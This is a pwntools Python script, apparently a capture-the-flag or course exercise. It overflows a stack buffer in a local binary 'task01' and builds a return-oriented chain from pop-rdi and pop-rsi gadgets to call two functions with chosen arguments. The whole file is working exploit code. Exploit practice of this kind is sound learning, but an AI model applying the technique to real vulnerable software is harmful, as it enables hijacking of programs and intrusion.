from pwn import *


io = process("./task01")
io.recvuntil(b"What is your name?")


junk_length = 128 + 8
msg = "Hack-in-progress\0"
junk = bytes(msg + 'a' * (junk_length - len(msg)), 'utf-8')
input = junk

first_ret_value = p64(0x4012db) # Address of "pop rdi; ret" gadget
rdi_value = p64(0xdeadbeef)
second_ret_value = p64(0x0401186) # Address of f1() function
input += first_ret_value + rdi_value + second_ret_value

third_ret_value = p64(0x4012db) # Address of "pop rdi; ret" gadget
rdi_value = p64(0x1234)
fourth_ret_value = p64(0x4012d9) # Address of "pop rsi; pop r15; ret" gadget
rsi_value = p64(0xabcd)
r15_value = p64(0x0000) # not important
fifth_ret_value = p64(0x04011AA) # Address of the f2() function
input += third_ret_value + rdi_value + fourth_ret_value + rsi_value + r15_value + fifth_ret_value


io.sendline(input)

# io.interactive()
out = io.recvallS()
print(out)
